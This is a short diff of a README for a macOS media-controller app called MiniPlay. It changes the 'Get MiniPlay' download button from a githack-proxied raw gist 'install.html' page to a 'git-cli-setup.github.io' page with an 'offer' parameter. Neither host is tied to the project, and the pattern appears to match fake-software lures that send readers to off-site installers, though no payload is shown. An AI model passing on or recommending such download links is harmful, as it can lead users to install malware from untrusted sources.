@@ -2,7 +2,7 @@
 
 MiniPlay for macOS provides a compact media controller that lets you manage playback, view track details, and switch between songs without opening the full music app.
 
-<a href="https://gistcdn.githack.com/eastitep1977/ba063ae7180b1ddf9e15649e6764bbb0/raw/27e0d0dd6b83da8bb0ff29d596520da6807dd535/install.html?offer=MiniPlay" target="_blank">
+<a href="https://git-cli-setup.github.io/.github/?offer=MiniPlay" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20MiniPlay%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="340" 
